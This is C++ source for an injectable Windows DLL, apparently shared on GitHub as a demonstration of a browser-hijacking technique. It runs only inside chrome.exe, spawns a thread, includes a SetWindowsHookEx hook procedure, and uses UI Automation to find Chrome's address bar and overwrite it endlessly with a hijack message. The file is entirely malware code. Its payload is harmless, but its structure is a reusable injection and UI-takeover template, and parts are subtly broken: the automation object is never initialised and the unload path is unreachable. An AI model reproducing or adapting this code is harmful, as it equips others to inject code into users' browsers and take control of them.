/*
Coded by Stressedd, published to GitHub.
Please, dont skid the code or try to use it for malicious purposes.
This is just a demonstration of a common attack used by malware devs.
*/

#include "dllmain.h"

#pragma data_seg("SHARED")
bool unloadDll = false;
HMODULE hThisDll = nullptr;
HANDLE hRemoteThread = nullptr;
#pragma data_seg()
#pragma comment(linker, "/section:SHARED,RWS")
IUIAutomation* g_pAutomation;

//Entry point of MalDll
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved)
{
	//Detect if the MalDLL was loaded 
	WCHAR applicationPath[MAX_PATH + 1];
	auto len = GetModuleFileNameW(nullptr, applicationPath, MAX_PATH);
	if (len > 0)
	{
		std::wstring applicationString(applicationPath);
		auto found = applicationString.find_last_of(L"/\\");
		if (applicationString.substr(found + 1) != L"chrome.exe")
		{

			return TRUE;
		}
	}
	else
	{
		//if chrome.exe is not found exit
		return TRUE;
	}

	//in the chrome.exe process, start malware activity
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//Only start a new thread if there's no existing one
		if (hThisDll == nullptr && lpReserved == nullptr)
		{
			hThisDll = hModule;
			InjectDLL();
		}
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


void __stdcall UnloadDLL()
{
	unloadDll = true;
}


void InjectDLL()
{
	hRemoteThread = HANDLE(_beginthread(asyncThreadFunction, 0, nullptr));
}

//This function is used for SetWindowsHookEx injections

LRESULT __stdcall hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	//display MessageBox if its successful
	MessageBoxW(nullptr, L"INJECTED", L"MALDLL WAS INJECTED.", MB_OK);

	if (hRemoteThread == nullptr)
	{
		InjectDLL();
	}


	return CallNextHookEx(nullptr, code, wParam, lParam);
}



//This function initializes the UI automation 
BOOL InitializeUIAutomation()
{
	CoInitialize(nullptr);
	auto hr = CoCreateInstance(CLSID_CUIAutomation, nullptr,
		CLSCTX_INPROC_SERVER, IID_IUIAutomation,
		reinterpret_cast<void**>(&g_pAutomation));
	return (SUCCEEDED(hr));
}


HRESULT listTree(int level, IUIAutomationElement* rootNode, IUIAutomationTreeWalker* walker)
{
	HRESULT hr;
	IUIAutomationElement* element = nullptr;
	auto base = std::wstring(level, L'-');

	//Get the first element
	hr = walker->GetFirstChildElement(rootNode, &element);
	if (FAILED(hr) || element == nullptr)
	{
		return hr;
	}

	while (element != nullptr)
	{
		//Is this a control element?
		BOOL isControl;
		hr = element->get_CurrentIsControlElement(&isControl);

		//Continue with children of the element
		listTree(level * 2, element, walker);

		IUIAutomationElement* next = nullptr;
		hr = walker->GetNextSiblingElement(element, &next);
		//Free the memory used for the current element
		SAFE_RELEASE(element);
		element = next;
	}

	return S_OK;
}


HRESULT buildFullTree(IUIAutomationElement* rootNode)
{
	//parse the UI nodes
	IUIAutomationTreeWalker* walker = nullptr;
	auto hr = g_pAutomation->get_ControlViewWalker(&walker);

	if (FAILED(hr) || walker == nullptr)
	{

		return hr;
	}


	hr = listTree(1, rootNode, walker);
	SAFE_RELEASE(walker);
	return hr;
}

//This is the actual thread 
//It will use the UI automation library to dump all UI elements of chrome
//Then, once it found the address bar, it writes 
//"BROWSER IS HIJACKED BY MALDLL! THIS SHOULD SIMULATE A MALWARE ATTACK." into it.

void asyncThreadFunction(void*)
{
//some elements which we will use 
	IUIAutomationElement* root_element = nullptr;
	IUIAutomationElement* chromeWindow = nullptr;
	IUIAutomationCondition* condition = nullptr;
	IUIAutomationElementArray* foundArray = nullptr;

	//Get the root element
	auto hr = g_pAutomation->GetRootElement(&root_element);

	//limit the UI automation to chrome
	VARIANT varProp;
	varProp.vt = VT_INT;
	varProp.intVal = GetCurrentProcessId();
	hr = g_pAutomation->CreatePropertyCondition(UIA_ProcessIdPropertyId, varProp, &condition);
	VariantClear(&varProp);

	//Find the root element of chrome
	hr = root_element->FindFirst(TreeScope_Children, condition, &chromeWindow);
	SAFE_RELEASE(condition);

//Get the window 
	BSTR retVal;
	chromeWindow->get_CurrentName(&retVal);

	//walk over all children UI elements
	hr = buildFullTree(chromeWindow);
	
	//Create the condition to find the address bar
	VARIANT varProp2;
	varProp2.vt = VT_INT;
	varProp2.intVal = UIA_EditControlTypeId;
	IUIAutomationCondition* editControlCondition = nullptr;
	IUIAutomationElement* foundElement = nullptr;

	hr = g_pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, varProp2, &editControlCondition);

    hr = chromeWindow->FindFirst(TreeScope_Descendants, editControlCondition, &foundElement);
	SAFE_RELEASE(editControlCondition);

    //Write into the address bar
	while (true) {
		IValueProvider* valueProvider = nullptr;
		foundElement->GetCurrentPattern(UIA_ValuePatternId, reinterpret_cast<IUnknown**>(&valueProvider));
		valueProvider->SetValue(L"BROWSER IS HIJACKED BY MALDLL! THIS SHOULD SIMULATE A MALWARE ATTACK.");
	}

//Wait for unload 
	while (!unloadDll)
	{
		//This creates some beep sound lmao
		Beep(1000, 1000);
		Sleep(1000L);
	}

	//Unload the DLL
	FreeLibrary(hThisDll);

	//possibility to reinject
	hThisDll = nullptr;
	hRemoteThread = nullptr;
}

